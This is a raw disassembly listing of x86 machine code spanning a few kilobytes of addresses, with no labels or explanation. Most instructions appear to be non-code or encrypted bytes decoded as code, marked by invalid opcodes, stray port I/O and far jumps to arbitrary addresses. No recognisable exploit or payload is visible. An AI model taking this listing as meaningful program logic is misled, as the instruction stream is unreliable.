  40c923:	jo     0x40c94c
  40c925:	(bad)  
  40c926:	jge    0x40c8f9
  40c928:	sub    al,0xec
  40c92a:	cmp    eax,0x951a10b7
  40c92f:	les    esp,FWORD PTR [ebx]
  40c931:	call   0x8901:0xedd210cd
  40c938:	fs or  al,0x1b
  40c93b:	jnp    0x40c994
  40c93d:	add    ebx,DWORD PTR [ecx]
  40c93f:	cmc    
  40c940:	es mov eax,0x66245b13
  40c946:	hlt    
  40c947:	mov    bh,0x2a
  40c949:	xlat   BYTE PTR ds:[ebx]
  40c94a:	push   0x35c4043d
  40c94f:	sbb    eax,0xfd1ed851
  40c954:	mov    ebp,eax
  40c956:	mov    esp,0x6cc613b3
  40c95b:	aaa    
  40c95c:	jne    0x40c9b2
  40c95e:	mov    cl,bh
  40c960:	push   ecx
  40c961:	dec    ecx
  40c962:	(bad)  
  40c963:	inc    DWORD PTR [edi+0x6b822934]
  40c969:	jl     0x40c9ea
  40c96b:	mov    esi,0xd115eff
  40c970:	stc    
  40c971:	inc    edx
  40c972:	dec    esi
  40c973:	push   es
  40c974:	xchg   ecx,eax
  40c975:	pop    ebx
  40c976:	mov    DWORD PTR [ebp-0x23],edi
  40c979:	dec    eax
  40c97a:	std    
  40c97b:	out    0x99,eax
  40c97d:	enter  0x5e9f,0xdf
  40c981:	mov    ah,0xd7
  40c983:	and    edx,DWORD PTR [ebx+0x607ed5f4]
  40c989:	inc    edx
  40c98a:	push   0xbf40585a
  40c98f:	mov    eax,ds:0x1ce898cb
  40c994:	push   ebx
  40c995:	dec    esi
  40c996:	jmp    0xa36499f9
  40c99b:	xor    ebx,DWORD PTR [ebx]
  40c99d:	cmp    eax,0xca77c158
  40c9a2:	aaa    
  40c9a3:	stos   BYTE PTR es:[edi],al
  40c9a4:	sbb    ecx,DWORD PTR ds:0x68180c7e
  40c9aa:	adc    al,0x55
  40c9ac:	out    dx,eax
  40c9ad:	push   ebp
  40c9ae:	pop    edi
  40c9af:	repz push ds
  40c9b1:	and    esi,esi
  40c9b3:	xchg   BYTE PTR [edi-0xe],cl
  40c9b6:	push   edx
  40c9b7:	ret    
  40c9b8:	push   eax
  40c9b9:	xchg   ecx,eax
  40c9ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c9bb:	call   0x9650:0x52126d2
  40c9c2:	mov    ebx,0xd99421a4
  40c9c7:	inc    ebx
  40c9c8:	pusha  
  40c9c9:	jge    0x40ca49
  40c9cb:	dec    edi
  40c9cc:	sbb    DWORD PTR [eax+0x4ff31361],0xffffffd2
  40c9d3:	je     0x40ca2b
  40c9d5:	sbb    DWORD PTR [ecx+0x7f],0x9436d6fd
  40c9dc:	and    ebx,DWORD PTR [edi]
  40c9de:	cld    
  40c9df:	ror    ebx,0x6d
  40c9e2:	in     al,dx
  40c9e3:	xchg   ecx,eax
  40c9e4:	or     DWORD PTR [esi],eax
  40c9e6:	pop    esi
  40c9e7:	mov    ah,0xd8
  40c9e9:	cli    
  40c9ea:	and    al,0x96
  40c9ec:	mov    bh,0x49
  40c9ee:	pop    eax
  40c9ef:	aad    0xaf
  40c9f1:	and    BYTE PTR [bp+di],bh
  40c9f4:	mov    ds:0xca628c7,al
  40c9f9:	out    0xf7,al
  40c9fb:	sub    bh,BYTE PTR [edx+0x453a9f50]
  40ca01:	xor    BYTE PTR [ecx],dl
  40ca03:	cwde   
  40ca04:	cmp    al,0xa1
  40ca06:	push   ss
  40ca07:	jmp    DWORD PTR ss:[ecx-0x3fe3ae72]
  40ca0e:	fcomp  DWORD PTR [esi]
  40ca10:	cli    
  40ca11:	scas   al,BYTE PTR es:[edi]
  40ca12:	xor    BYTE PTR [ecx+0x30de368b],dl
  40ca18:	mov    eax,0x19fd71d9
  40ca1d:	(bad)  
  40ca1e:	dec    edi
  40ca1f:	pop    ds
  40ca20:	xchg   edi,eax
  40ca21:	jmp    0x7534:0x84daae8f
  40ca28:	sub    ebp,esi
  40ca2a:	sbb    eax,0x4679967f
  40ca2f:	aas    
  40ca30:	jmp    0x40ca8e
  40ca32:	outs   dx,DWORD PTR ds:[esi]
  40ca33:	es xchg esp,eax
  40ca35:	adc    dh,dl
  40ca37:	dec    edi
  40ca38:	push   0x27
  40ca3a:	ret    
  40ca3b:	pop    ecx
  40ca3c:	pop    ecx
  40ca3d:	div    DWORD PTR [ebx-0x4a]
  40ca40:	push   edx
  40ca41:	repnz pop edi
  40ca43:	ja     0x40cab7
  40ca45:	fst    DWORD PTR [esi-0x50892399]
  40ca4b:	sbb    BYTE PTR [esi],dh
  40ca4d:	fwait
  40ca4e:	jecxz  0x40ca27
  40ca50:	dec    ebp
  40ca51:	mov    dh,0x6f
  40ca53:	cmp    al,0xfc
  40ca55:	js     0x40c9fa
  40ca57:	dec    esi
  40ca58:	inc    esp
  40ca59:	dec    ebx
  40ca5a:	push   0xffffffaf
  40ca5c:	jg     0x40ca6d
  40ca5e:	push   ebp
  40ca5f:	push   0xffffffa4
  40ca61:	cmp    DWORD PTR [ecx],0xb4871694
  40ca67:	in     eax,dx
  40ca68:	or     BYTE PTR ds:0xbb6ef6f8,dh
  40ca6e:	push   0xbe5e29df
  40ca73:	das    
  40ca74:	adc    al,0x26
  40ca76:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ca77:	lods   al,BYTE PTR ds:[esi]
  40ca78:	inc    esp
  40ca79:	arpl   WORD PTR [ecx+edi*1],cx
  40ca7c:	xchg   ebx,eax
  40ca7d:	dec    ebx
  40ca7e:	in     al,dx
  40ca7f:	mov    edx,0xdc7abfc3
  40ca85:	data16 stos BYTE PTR es:[edi],al
  40ca87:	imul   edx,DWORD PTR [eax+0x1b],0xffffffc2
  40ca8b:	cmc    
  40ca8c:	push   edi
  40ca8d:	ret    
  40ca8e:	pop    ss
  40ca8f:	enter  0x1ecf,0x7b
  40ca93:	push   0x12e78cc4
  40ca98:	inc    ebp
  40ca99:	dec    ebp
  40ca9a:	mov    al,0x3b
  40ca9c:	xor    DWORD PTR [eax],esi
  40ca9e:	jmp    0x40ca62
  40caa0:	fisub  WORD PTR [edi]
  40caa2:	xor    DWORD PTR [eax],edx
  40caa4:	mov    cl,0xcd
  40caa6:	sub    eax,0x511d31a7
  40caab:	pop    ds
  40caac:	mov    esi,0xe1cfecd3
  40cab1:	add    dl,ch
  40cab3:	push   edi
  40cab4:	pop    ebp
  40cab5:	add    al,0x57
  40cab7:	in     al,dx
  40cab8:	dec    edi
  40cab9:	mov    ebx,DWORD PTR ds:0xf9858aed
  40cabf:	push   0x6f
  40cac1:	push   0x3a
  40cac3:	push   edx
  40cac4:	sub    BYTE PTR [ebp+0xb],0x40
  40cac8:	rcl    BYTE PTR ds:0x8fdfb23d,cl
  40cace:	ins    BYTE PTR es:[edi],dx
  40cacf:	(bad)  
  40cad0:	scas   al,BYTE PTR es:[edi]
  40cad1:	and    bh,0x14
  40cad4:	rcl    DWORD PTR [edx-0x500f17ec],0xb6
  40cadb:	push   edi
  40cadc:	jnp    0x40cb0f
  40cade:	pop    es
  40cadf:	repnz push edi
  40cae1:	das    
  40cae2:	hlt    
  40cae3:	js     0x40cb18
  40cae5:	jg     0x40cb56
  40cae7:	mov    al,ds:0x45c519c0
  40caec:	das    
  40caed:	xchg   ecx,eax
  40caee:	call   0x8c4d:0x65e6f4c9
  40caf5:	not    BYTE PTR [eax+0x2]
  40caf8:	xchg   ebp,ebx
  40cafa:	pop    edx
  40cafb:	xchg   esp,eax
  40cafc:	dec    esi
  40cafd:	mov    al,ds:0xfa4ba583
  40cb02:	xchg   esi,eax
  40cb03:	sbb    DWORD PTR ds:0x1e7849d7,edx
  40cb09:	push   ss
  40cb0a:	sbb    eax,0x41ef5065
  40cb0f:	jge    0x40ca92
  40cb11:	xor    esi,DWORD PTR [esp+eax*1]
  40cb14:	push   edi
  40cb15:	(bad)  
  40cb17:	popa   
  40cb18:	call   0x5332e000
  40cb1d:	ja     0x40cad6
  40cb1f:	push   ds
  40cb20:	test   eax,0x9f37a564
  40cb25:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb27:	call   0xee56b2a6
  40cb2c:	loope  0x40cb0d
  40cb2e:	rol    DWORD PTR [edx-0x37],0xff
  40cb32:	xchg   DWORD PTR ds:0xe1a5eb49,edx
  40cb38:	jecxz  0x40cb3e
  40cb3a:	pop    esi
  40cb3b:	enter  0x69f6,0x5e
  40cb3f:	xor    bl,BYTE PTR [edx+edi*4+0x5b58c03d]
  40cb46:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cb47:	sbb    bl,ch
  40cb49:	mov    al,0xac
  40cb4b:	or     esi,DWORD PTR ds:0x35400c46
  40cb51:	in     al,dx
  40cb52:	clc    
  40cb53:	mov    dh,0x2b
  40cb55:	jae    0x40cb05
  40cb57:	pop    edx
  40cb58:	add    BYTE PTR [ecx-0x4aad6f55],ch
  40cb5e:	push   edi
  40cb5f:	dec    esi
  40cb60:	push   0x52f91e47
  40cb65:	ds jg  0x40cbb2
  40cb68:	and    al,0xe8
  40cb6a:	(bad)  
  40cb6b:	and    dl,BYTE PTR [edx-0x3834e750]
  40cb71:	mov    ebx,0x2801403c
  40cb76:	xor    al,0x76
  40cb78:	jae    0x40cb42
  40cb7a:	mov    BYTE PTR [edi+0x3989a095],dh
  40cb80:	int3   
  40cb81:	cld    
  40cb82:	dec    BYTE PTR ds:0xc67f1512
  40cb88:	ds mov al,0x8f
  40cb8b:	sbb    BYTE PTR [ebx+ebp*1],al
  40cb8e:	and    dl,BYTE PTR ds:0xf37eb5bb
  40cb94:	jmp    0x990676a5
  40cb99:	mov    esp,0x16f77374
  40cb9e:	sbb    al,0x29
  40cba0:	adc    bl,BYTE PTR [eax-0x75c08f2d]
  40cba6:	(bad)  
  40cba7:	fmulp  st(2),st
  40cba9:	ror    DWORD PTR [edi],1
  40cbab:	test   BYTE PTR [edx+ebp*8],dh
  40cbae:	les    ecx,FWORD PTR [ebx]
  40cbb0:	aad    0x3b
  40cbb2:	ss pop eax
  40cbb4:	cmp    eax,0x38a29537
  40cbb9:	mov    DWORD PTR [eax],edi
  40cbbb:	ret    0xd216
  40cbbe:	scas   eax,DWORD PTR es:[edi]
  40cbbf:	in     al,0xc0
  40cbc1:	or     dh,BYTE PTR [edi+0x14580959]
  40cbc7:	fmul   DWORD PTR cs:[edi-0x17]
  40cbcb:	and    ebp,DWORD PTR [edx-0x39]
  40cbce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbcf:	fld    TBYTE PTR [ebp+0x1]
  40cbd2:	inc    esp
  40cbd3:	imul   ebx,ebp,0x9
  40cbd6:	xchg   ebx,eax
  40cbd7:	jae    0x40cbe3
  40cbd9:	int    0xf5
  40cbdb:	rol    DWORD PTR [esi],1
  40cbdd:	xor    ebx,DWORD PTR [ebp-0x2a79dad8]
  40cbe3:	sub    eax,0xedab2d4c
  40cbe8:	xchg   esi,eax
  40cbe9:	cli    
  40cbea:	test   DWORD PTR ds:0x413ac582,esi
  40cbf0:	call   0xbbb7beaf
  40cbf5:	lods   eax,DWORD PTR ds:[si]
  40cbf7:	jns    0x40cbd7
  40cbf9:	adc    BYTE PTR [eax-0x4b075b94],0x1d
  40cc00:	adc    esi,DWORD PTR [ebx]
  40cc02:	arpl   WORD PTR [ebp-0x13],si
  40cc05:	dec    esi
  40cc06:	add    eax,0x9d83dde6
  40cc0b:	jb     0x40cbb5
  40cc0d:	popf   
  40cc0e:	cmp    edx,ebp
  40cc10:	pop    ebx
  40cc11:	int    0x61
  40cc13:	pushf  
  40cc14:	retf   
  40cc15:	push   edx
  40cc16:	ss pop ds
  40cc18:	sbb    ebx,edi
  40cc1a:	cmc    
  40cc1b:	cmp    ecx,DWORD PTR [esp+esi*2-0x3f86c7f5]
  40cc22:	fs loopne 0x40cc99
  40cc25:	das    
  40cc26:	push   ebp
  40cc27:	pop    ebp
  40cc28:	pop    esp
  40cc29:	cmp    BYTE PTR [ecx-0x34],cl
  40cc2c:	cmc    
  40cc2d:	mov    edx,0x56609700
  40cc32:	jmp    0x40cbec
  40cc34:	nop
  40cc35:	loop   0x40cc05
  40cc37:	test   al,0x5
  40cc39:	pop    ecx
  40cc3a:	iret   
  40cc3b:	fst    QWORD PTR [eax+0x55]
  40cc3e:	or     DWORD PTR [ecx+edx*4],0x27
  40cc42:	(bad)  
  40cc43:	mov    ecx,0x7e95c2c1
  40cc48:	loop   0x40cbf9
  40cc4a:	mov    ah,0xd6
  40cc4c:	sbb    al,0xf3
  40cc4e:	lds    eax,FWORD PTR [eax+0x18685ec0]
  40cc54:	in     al,0xe5
  40cc56:	add    eax,0xe1710af8
  40cc5b:	(bad)  
  40cc5c:	jns    0x40cc75
  40cc5e:	add    ch,BYTE PTR [ebx+0x241c943]
  40cc64:	or     esi,DWORD PTR [esi-0x1a4c91b0]
  40cc6a:	out    0x13,eax
  40cc6c:	cmp    BYTE PTR [ebx+eiz*1-0x1940fb4f],ah
  40cc73:	adc    cl,BYTE PTR [edi]
  40cc75:	mov    ebx,0xa2bc51d7
  40cc7a:	stos   DWORD PTR es:[edi],eax
  40cc7b:	adc    ebp,DWORD PTR [ebx-0x2dc33747]
  40cc81:	fwait
  40cc82:	rol    ecx,1
  40cc84:	int    0x80
  40cc86:	push   ebp
  40cc87:	push   ebp
  40cc88:	pop    ss
  40cc89:	jg     0x40cc55
  40cc8b:	mov    esp,0x26af7c1
  40cc90:	push   edx
  40cc91:	pop    ss
  40cc92:	leave  
  40cc93:	frstor [ecx+0x4a]
  40cc96:	push   eax
  40cc97:	ds dec ecx
  40cc99:	scas   eax,DWORD PTR es:[edi]
  40cc9a:	test   DWORD PTR [ebp+0x2a085246],edx
  40cca0:	jge    0x40cd0b
  40cca2:	or     BYTE PTR [esi],bh
  40cca4:	add    DWORD PTR [ebx],eax
  40cca6:	push   ss
  40cca7:	xchg   ecx,eax
  40cca8:	and    eax,0x6e88b54b
  40ccad:	cmp    BYTE PTR [eax-0x3e],dh
  40ccb0:	daa    
  40ccb1:	xor    al,0xdd
  40ccb3:	mov    ch,0x37
  40ccb5:	int3   
  40ccb6:	dec    edi
  40ccb7:	pop    ss
  40ccb8:	adc    al,0x83
  40ccba:	ror    BYTE PTR [edx],1
  40ccbc:	or     DWORD PTR [ecx],esp
  40ccbe:	fdivr  st,st(3)
  40ccc0:	into   
  40ccc1:	and    DWORD PTR [ebp-0x7cc549b],0xf903d103
  40cccb:	imul   edx,edi
  40ccce:	add    edx,DWORD PTR [ebp-0x14]
  40ccd1:	mov    DWORD PTR [ebp-0x14],edx
  40ccd4:	mov    edx,DWORD PTR [ebp-0xc]
  40ccd7:	mov    edi,DWORD PTR [ebp-0x24]
  40ccda:	xor    edx,eax
  40ccdc:	add    edx,ecx
  40ccde:	imul   edx,edi
  40cce1:	mov    edi,DWORD PTR [ebp-0xc]
  40cce4:	xor    edi,eax
  40cce6:	sub    edx,edi
  40cce8:	mov    edi,DWORD PTR [ebp-0xc]
  40cceb:	mov    ebx,DWORD PTR [ebp-0x14]
  40ccee:	xor    edi,eax
  40ccf0:	add    edi,ecx
  40ccf2:	imul   edi,ebx
  40ccf5:	mov    ebx,DWORD PTR [ebp-0x18]
  40ccf8:	xor    ebx,eax
  40ccfa:	sub    edx,ecx
  40ccfc:	lea    edi,[edi+ebx*1+0x32729c]
  40cd03:	cmp    edi,edx
  40cd05:	jmp    0x40d0c3
  40cd0a:	mov    eax,0xf165d76a
  40cd0f:	popa   
  40cd10:	jbe    0x40cd7b
  40cd12:	(bad)  
  40cd14:	xchg   ebx,eax
  40cd15:	sub    DWORD PTR [eax+ecx*2-0x6ff40ecd],0x70
  40cd1d:	jo     0x40ccbe
  40cd1f:	jge    0x40cd91
  40cd21:	jo     0x40cd85
  40cd23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40cd24:	fdiv   QWORD PTR [esi-0x36]
  40cd27:	dec    esp
  40cd28:	repz dec ebp
  40cd2a:	adc    DWORD PTR [esi],esi
  40cd2c:	push   ebx
  40cd2d:	mov    al,0x73
  40cd2f:	push   DWORD PTR [ebp+0x4b8e0016]
  40cd35:	outs   dx,DWORD PTR ds:[esi]
  40cd36:	(bad)  
  40cd37:	call   0xc80b:0x796bf260
  40cd3e:	adc    DWORD PTR [edx-0x9],esi
  40cd41:	js     0x40cd7a
  40cd43:	sub    esp,eax
  40cd45:	mov    bh,BYTE PTR [edi]
  40cd47:	into   
  40cd48:	push   esi
  40cd49:	cmp    BYTE PTR [ebp+0x7],dh
  40cd4c:	pop    esp
  40cd4d:	xchg   BYTE PTR [edi+0x287b0e8f],al
  40cd53:	push   ss
  40cd54:	pop    ds
  40cd55:	scas   al,BYTE PTR es:[edi]
  40cd56:	es and al,0x68
  40cd59:	push   ebp
  40cd5a:	mov    edi,0x7f432115
  40cd5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd60:	push   ebx
  40cd61:	out    0x68,al
  40cd63:	pusha  
  40cd64:	scas   al,BYTE PTR es:[edi]
  40cd65:	out    0xc0,al
  40cd67:	and    bl,BYTE PTR [esp+ebx*1]
  40cd6a:	and    BYTE PTR [esi+edx*8],al
  40cd6d:	add    ecx,DWORD PTR [edx+0x28c0726c]
  40cd73:	sahf   
  40cd74:	rcr    esi,cl
  40cd76:	adc    al,bh
  40cd78:	pop    ebx
  40cd79:	lods   al,BYTE PTR ds:[esi]
  40cd7a:	lock dec eax
  40cd7c:	pusha  
  40cd7d:	jo     0x40cd7e
  40cd7f:	add    bl,dh
  40cd81:	jbe    0x40cda7
  40cd83:	dec    eax
  40cd84:	and    eax,0x52576d81
  40cd89:	das    
  40cd8a:	enter  0x3d72,0xc1
  40cd8e:	jmp    0x40cda3
  40cd90:	push   ebp
  40cd91:	ret    
  40cd92:	call   0xda05df7c
  40cd97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd98:	test   DWORD PTR [ebx],ebp
  40cd9a:	clc    
  40cd9b:	out    dx,al
  40cd9c:	cmp    edx,0x51cd72b2
  40cda2:	fdivr  DWORD PTR [eax]
  40cda4:	add    DWORD PTR [ecx+0x36],ebp
  40cda7:	enter  0xe3c6,0x9b
  40cdab:	dec    ebx
  40cdac:	dec    eax
  40cdad:	test   ebp,edx
  40cdaf:	lea    esp,[edx+ebx*1]
  40cdb2:	lds    edi,FWORD PTR [edi+0x41]
  40cdb5:	adc    DWORD PTR [esi],ecx
  40cdb7:	inc    esi
  40cdb8:	mov    dl,0xe3
  40cdba:	fld    TBYTE PTR [esi+0x7a]
  40cdbd:	test   DWORD PTR [edi+edi*8-0x7258082],edi
  40cdc4:	call   0x9af9:0xbd6a084e
  40cdcb:	dec    esp
  40cdcc:	fsubr  QWORD PTR [ebx+esi*8-0x2fe3bd3d]
  40cdd3:	jmp    0x9e3b13e4
  40cdd8:	in     eax,dx
  40cdd9:	mov    cl,0x42
  40cddb:	test   eax,0xf02b091b
  40cde0:	stc    
  40cde1:	xchg   BYTE PTR [esp+ebp*4],bh
  40cde4:	mov    edx,0xf2f13a6
  40cde9:	sti    
  40cdea:	xor    BYTE PTR [edx+0x2fcf10fd],0x73
  40cdf1:	cld    
  40cdf2:	(bad)  
  40cdf4:	and    eax,0xdc028d59
  40cdf9:	js     0x40cd9b
  40cdfb:	mov    ebp,0x3eeff82f
  40ce00:	or     al,0x81
  40ce02:	xchg   edi,eax
  40ce03:	xor    eax,DWORD PTR [ecx]
  40ce05:	push   ss
  40ce06:	retf   
  40ce07:	test   DWORD PTR [ebx],0x7eacfd6a
  40ce0d:	sub    DWORD PTR [ebx-0x30],ebx
  40ce10:	adc    BYTE PTR [eax-0x15],bh
  40ce13:	mov    ecx,0x935564ef
  40ce18:	adc    eax,0x1bcd292c
  40ce1d:	fbstp  TBYTE PTR [ebx]
  40ce1f:	mov    esp,0x28cb50f8
  40ce24:	pop    ss
  40ce25:	sbb    BYTE PTR [ecx],0x27
  40ce28:	mov    ecx,DWORD PTR [edi-0x7d9b73c5]
  40ce2e:	mov    eax,0x2b38c89
  40ce33:	sbb    al,0xa0
  40ce35:	add    edx,DWORD PTR [edi+edi*4+0x54e7aad4]
  40ce3c:	mov    dl,0x6e
  40ce3e:	xchg   ecx,eax
  40ce3f:	push   ebp
  40ce40:	inc    ecx
  40ce41:	jo     0x40ce00
  40ce43:	or     eax,0xd6d2da94
  40ce48:	inc    ebp
  40ce49:	jno    0x40ce2b
  40ce4b:	loopne 0x40cdee
  40ce4d:	push   edx
  40ce4e:	sti    
  40ce4f:	ror    edi,0x73
  40ce52:	fnsave [ebp+0x67]
  40ce55:	pop    esi
  40ce56:	mov    cl,0x34
  40ce58:	jo     0x40ceba
  40ce5a:	sub    al,0x69
  40ce5c:	fisttp DWORD PTR [esi*8+0x7476f833]
  40ce63:	pop    edx
  40ce64:	jne    0x569feb50
  40ce6a:	stc    
  40ce6b:	xchg   ebp,eax
  40ce6c:	pop    es
  40ce6d:	aad    0xe8
  40ce6f:	rcl    DWORD PTR [esi+eax*2+0x7f0ab6c4],cl
  40ce76:	jne    0x40cef0
  40ce78:	mov    ebx,0x276cee91
  40ce7d:	aad    0x97
  40ce7f:	dec    ebx
  40ce80:	rcl    dh,cl
  40ce82:	loop   0x40ce37
  40ce84:	test   eax,0x398a82ae
  40ce89:	inc    eax
  40ce8a:	xchg   edx,edx
  40ce8c:	paddusb mm2,QWORD PTR [edi]
  40ce8f:	shr    BYTE PTR [ecx-0x7d],1
  40ce92:	and    eax,0x359121e9
  40ce97:	popf   
  40ce98:	pop    ecx
  40ce99:	popa   
  40ce9a:	dec    ebx
  40ce9b:	mov    al,ds:0xa3c919fd
  40cea0:	cld    
  40cea1:	in     al,dx
  40cea2:	rcr    ebp,1
  40cea4:	mov    al,0x72
  40cea6:	inc    ebx
  40cea7:	pushf  
  40cea8:	inc    ecx
  40cea9:	mov    cl,0x61
  40ceab:	adc    BYTE PTR [ebx-0x44f0d869],dl
  40ceb1:	mov    bl,0x1
  40ceb3:	jmp    0x40ce4b
  40ceb5:	mov    ah,0xf2
  40ceb7:	xchg   esi,eax
  40ceb8:	mov    eax,0x1dc23c01
  40cebd:	sub    dl,BYTE PTR [edx]
  40cebf:	sbb    DWORD PTR [ebp+edi*8-0x58],edx
  40cec3:	pop    es
  40cec4:	mov    ebx,0x7718ab90
  40cec9:	dec    esp
  40ceca:	xchg   esp,eax
  40cecb:	dec    ecx
  40cecc:	inc    ebx
  40cecd:	sbb    ch,BYTE PTR [edx]
  40cecf:	je     0x40ce5d
  40ced1:	pop    esi
  40ced2:	call   0x218b0e07
  40ced7:	pop    eax
  40ced8:	pop    ecx
  40ced9:	scas   al,BYTE PTR es:[edi]
  40ceda:	test   al,0xc1
  40cedc:	sbb    cl,dl
  40cede:	test   DWORD PTR [ecx],edx
  40cee0:	jns    0x40ce90
  40cee2:	ret    
  40cee3:	sub    eax,0x48a5de2d
  40cee8:	sub    BYTE PTR [ecx],dh
  40ceea:	xor    ah,0x4c
  40ceed:	call   0xab6aad8f
  40cef2:	repnz mov cl,0x1c
  40cef5:	add    DWORD PTR [esi+eax*8+0x21],0xffffff9e
  40cefa:	repnz aad 0xf6
  40cefd:	daa    
  40cefe:	mov    eax,ds:0x13c15ea6
  40cf03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cf04:	mov    BYTE PTR [ebx],ch
  40cf06:	xchg   ebx,eax
  40cf07:	adc    al,0x48
  40cf09:	ficom  DWORD PTR [ebx]
  40cf0b:	add    al,0xd1
  40cf0d:	xor    eax,0x1d7c84e0
  40cf12:	fidiv  WORD PTR [edx-0x12]
  40cf15:	jae    0x40cf8b
  40cf17:	cs pop ecx
  40cf19:	sub    eax,0xa54af3ee
  40cf1e:	sub    edx,ebx
  40cf20:	and    eax,0x527a99fa
  40cf25:	ficom  WORD PTR [eax-0x39]
  40cf28:	jb     0x40cf69
  40cf2a:	fs adc eax,0xbe6cd93
  40cf30:	call   0x758000f5
  40cf35:	push   ebp
  40cf36:	or     al,0x89
  40cf38:	sar    DWORD PTR [esi],cl
  40cf3a:	cmc    
  40cf3b:	mov    ebp,0x145983ee
  40cf40:	es and al,0x27
  40cf43:	xor    ecx,esp
  40cf45:	dec    esp
  40cf46:	aad    0xca
  40cf48:	ja     0x40cfa1
  40cf4a:	mov    bh,al
  40cf4c:	lds    esi,FWORD PTR [ecx+0x5959d0f9]
  40cf52:	xchg   edi,eax
  40cf53:	shl    DWORD PTR [edi+0x634f3dc9],cl
  40cf59:	call   0x26b81702
  40cf5e:	fadd   DWORD PTR ds:0x11d34b7e
  40cf64:	rcr    esi,0xef
  40cf67:	(bad)  
  40cf69:	mov    BYTE PTR [ebx],bl
  40cf6b:	xchg   DWORD PTR [eax+0x20],ebp
  40cf6e:	test   DWORD PTR [ebp-0x3023b60d],esp
  40cf74:	or     ecx,ecx
  40cf76:	test   DWORD PTR [ebp-0x3361e58],0x56b2963b
  40cf80:	es push si
  40cf83:	dec    edx
  40cf84:	cmp    DWORD PTR [edx],ecx
  40cf86:	fist   WORD PTR [esi-0x322950eb]
  40cf8c:	sbb    ecx,edi
  40cf8e:	or     DWORD PTR [bx+si],ecx
  40cf91:	or     eax,0x30426386
  40cf96:	sub    BYTE PTR [edi+esi*4-0x35],ah
  40cf9a:	adc    eax,0xe06efaf4
  40cf9f:	fcomp  QWORD PTR [eax]
  40cfa1:	sub    eax,0x8785f72
  40cfa6:	fcomi  st,st(6)
  40cfa8:	jo     0x40cf93
  40cfaa:	mov    cl,0xd4
  40cfac:	out    0xb4,al
  40cfae:	test   eax,0x75392bc2
  40cfb3:	jns    0x40cf54
  40cfb5:	adc    eax,0x67672bd3
  40cfba:	cmp    al,0x4c
  40cfbc:	sti    
  40cfbd:	mov    BYTE PTR [ecx],al
  40cfbf:	cdq    
  40cfc0:	nop    DWORD PTR [esi]
  40cfc3:	clc    
  40cfc4:	lahf   
  40cfc5:	push   ss
  40cfc6:	std    
  40cfc7:	ret    0xf88f
  40cfca:	cmp    BYTE PTR [edi+ebp*2-0x21],dh
  40cfce:	rcr    DWORD PTR [ebx-0x2bd3f4e8],cl
  40cfd4:	lods   al,BYTE PTR ds:[esi]
  40cfd5:	ret    0xe61f
  40cfd8:	mov    al,0xa7
  40cfda:	cmc    
  40cfdb:	fdiv   QWORD PTR [edx]
  40cfdd:	add    eax,0x78fbc172
  40cfe2:	and    dl,BYTE PTR [edi+edx*8+0xca63b57]
  40cfe9:	mov    ebx,0x145b3024
  40cfee:	lea    edx,[eax+0x11dc483a]
  40cff4:	and    al,0xcb
  40cff6:	test   DWORD PTR [esp+edi*2+0x22],ebx
  40cffa:	addr16 push cs
  40cffc:	stos   DWORD PTR es:[edi],eax
  40cffd:	mov    bl,0xfa
  40cfff:	outs   dx,BYTE PTR ds:[esi]
  40d000:	pop    esi
  40d001:	in     al,0x3c
  40d003:	mov    ds:0xbf14b67c,al
  40d008:	in     al,0xe8
  40d00a:	(bad)  
  40d00b:	in     eax,dx
  40d00c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d00d:	dec    ebx
  40d00e:	mov    esi,0x33801f95
  40d013:	ss out 0xeb,eax
  40d016:	xchg   esi,eax
  40d017:	lods   eax,DWORD PTR ds:[esi]
  40d018:	lahf   
  40d019:	or     eax,0xbe20ffd
  40d01e:	mov    WORD PTR [edx],es
  40d020:	dec    esi
  40d021:	dec    eax
  40d022:	or     esp,edi
  40d024:	lods   eax,DWORD PTR ds:[esi]
  40d025:	test   BYTE PTR [edx],ch
  40d027:	(bad)  
  40d028:	mov    bh,0x66
  40d02a:	lods   al,BYTE PTR ds:[esi]
  40d02b:	or     esp,ebp
  40d02d:	pop    es
  40d02e:	xchg   ecx,eax
  40d02f:	pop    eax
  40d030:	xchg   ebx,eax
  40d031:	inc    ch
  40d033:	xchg   esi,eax
  40d034:	add    dh,BYTE PTR [edx]
  40d036:	dec    ebx
  40d037:	imul   esi,DWORD PTR [edi+0x1a6adfa1],0xd9bbc331
  40d041:	icebp  
  40d042:	push   0x9f27a509
  40d047:	int    0x1c
  40d049:	add    bh,BYTE PTR [ebx+0x2e18a76b]
  40d04f:	fisubr DWORD PTR [ebx*2-0x260f63e8]
  40d056:	and    eax,0x2c79ad7b
  40d05b:	jbe    0x40d05f
  40d05d:	enter  0x6067,0xfb
  40d061:	lock hlt 
  40d063:	jge    0x40cff6
  40d065:	in     al,0xa7
  40d067:	mov    bl,0x9d
  40d069:	into   
  40d06a:	jne    0x40d07f
  40d06c:	sbb    DWORD PTR [ebx-0x7daaedfc],ecx
  40d072:	dec    eax
  40d073:	fisttp WORD PTR [ebx]
  40d075:	mov    eax,ds:0xcc4a7979
  40d07a:	retf   0xfa25
  40d07d:	cmp    esp,DWORD PTR [ecx]
  40d07f:	sub    eax,0xb5d09138
  40d084:	popa   
  40d085:	or     ch,dh
  40d087:	cmp    BYTE PTR [ebp-0x7009ff01],0x87
  40d08e:	or     al,0xd3
  40d090:	mov    ds:0xc50ccb43,al
  40d095:	xchg   dl,al
  40d097:	push   esp
  40d098:	adc    esi,DWORD PTR [edi]
  40d09a:	rcr    BYTE PTR [edi+0x10888d8],0x71
  40d0a1:	push   0x5ef12c6a
  40d0a6:	sbb    eax,0x8579ce77
  40d0ab:	out    0xdd,al
  40d0ad:	nop
  40d0ae:	mov    ch,0xd1
  40d0b0:	add    DWORD PTR [edx+eax*8],edi
  40d0b3:	mov    ah,0x20
  40d0b5:	test   al,0xd7
  40d0b7:	jnp    0x40d109
  40d0b9:	and    BYTE PTR [ecx-0x196d234d],ch
  40d0bf:	ret    0x293a
  40d0c2:	retf   0x860f
  40d0c5:	data16 lock (bad) 
